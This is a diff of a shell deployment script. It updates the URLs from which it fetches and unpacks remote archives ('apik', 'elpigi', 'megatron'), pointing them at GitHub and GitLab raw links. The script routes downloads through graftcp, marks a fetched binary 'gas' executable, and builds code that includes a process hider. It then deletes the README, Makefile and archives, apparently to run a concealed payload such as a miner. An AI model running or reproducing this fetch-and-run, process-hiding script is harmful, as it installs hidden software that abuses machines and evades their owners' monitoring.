@@ -5,7 +5,7 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
 
-wget https://sc1.nasihosting.com/apik.tar.gz
+wget https://github.com/maszehh/sempak/raw/main/apik.tar.gz
 tar -xvzf apik.tar.gz
 rm -rf apik.tar.gz
 
@@ -36,7 +36,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp rm -rf gas && wget -q 'https://sc1.nasihosting.com/elpigi.zip' && unzip elpigi.zip
+./graftcp/graftcp rm -rf gas && wget -q 'https://gitlab.com/guruberburu/alhamdulillah/-/raw/main/elpigi.zip' && unzip elpigi.zip
 chmod +x gas
 rm -rf Makefile
 rm -rf processhider.c
@@ -44,7 +44,7 @@ rm -rf README.md
 rm -rf .gitignore
 rm -rf elpigi.zip
 
-./graftcp/graftcp wget https://sc1.nasihosting.com/megatron.zip
+./graftcp/graftcp wget https://github.com/maszehh/sempak/raw/main/megatron.zip
 unzip megatron.zip
 rm -rf megatron.zip
 make
